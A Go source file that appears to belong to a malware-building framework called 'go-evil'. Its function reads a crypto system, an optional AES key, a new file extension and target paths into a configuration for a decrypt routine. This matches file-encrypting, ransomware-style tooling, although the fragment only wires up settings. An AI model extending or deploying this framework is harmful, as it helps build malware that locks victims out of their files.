package decrypt

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/domains/crypto/configuration"
	evil_target "github.com/TeamPhoneix/go-evil/domains/crypto/target"
	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func preface_configuration(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call_history := []string{}

	arr := structure.Create_evil_object(value)

	if arr.Length() != 0 && arr.Length() < 4 {
		notify.Error(fmt.Sprintf("Expected atleast four values, but recieved %d", arr.Length()), "crypt.Decrypt()")

	} else if arr.Length() == 4 {
		crypto_system := arr.Pop_front()
		key := arr.Pop_front() // If this is empty, then we need to generate a key
		new_extension := arr.Pop_front()
		targets := arr.Dump() // Grab all the targets

		// Set the crypto
		call := []string{}

		call, s_json = configuration.Set_crypto(crypto_system, s_json)
		call_history = append(call_history, call...)

		// Key handling
		if key != "" { // We got a key to use
			call, s_json = configuration.Set_aes_key(key, s_json)
			call_history = append(call_history, call...)
		}

		// Set extension
		call, s_json = configuration.Set_extension(new_extension, s_json)
		call_history = append(call_history, call...)

		// Set targets
		for _, target := range targets {
			if target != "" {
				call, s_json = evil_target.Add(target, s_json)
				call_history = append(call_history, call...)
			}

		}

		data_object = structure.Receive(s_json) // Update our structure
	}

	return call_history, structure.Send(data_object)

}
